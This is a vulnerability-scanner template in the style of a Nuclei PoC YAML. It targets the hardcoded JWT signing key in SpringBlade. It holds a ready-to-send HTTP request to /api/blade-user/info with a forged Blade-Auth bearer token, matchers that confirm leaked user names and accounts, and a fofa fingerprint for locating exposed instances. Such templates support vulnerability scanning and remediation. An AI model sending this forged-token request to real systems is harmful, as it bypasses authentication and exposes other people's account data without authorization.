id: poc-yaml-springblade-info-hard-coded-key
info:
  name: SpringBlade Info Hardcoded Key Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: hardcoded-credentials
  metadata:
    finger: springblade
    fofa: body="https://bladex.vip"

http:
  - raw:
      - |
        GET /api/blade-user/info HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "\"success\":true"

      - type: regex
        part: body
        regex:
          - "\\\"name\\\":\\\"[\\u4e00-\\u9fa5]+\\\""
          - "\\\"account\\\":\\\"[0-9a-zA-Z]+\\\""

      - type: word
        part: header
        words:
          - "application/json"
